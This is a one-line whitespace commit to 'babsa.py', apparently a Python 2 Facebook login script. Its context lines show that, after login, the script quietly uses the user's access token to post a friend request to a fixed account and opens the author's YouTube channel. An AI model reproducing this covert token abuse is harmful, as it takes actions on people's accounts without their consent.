0decc5d0f39594240156cd783f8f37e2e237c2e4
darkvikrant <60290718+darkvikrant@users.noreply.github.com>
2020-04-05 16:50:20 +0530

    Update babsa.py

--- babsa.py
+++ babsa.py
@@ -99,7 +99,7 @@ def login():
 				os.system('xdg-open https://www.youtube.com/channel/UC4x29jHh48BmYF9h6BD3loA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
-		         	except requests.exceptions.ConnectionError:
+		      	except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;91mThere is no internet connection"
 				keluar()
 
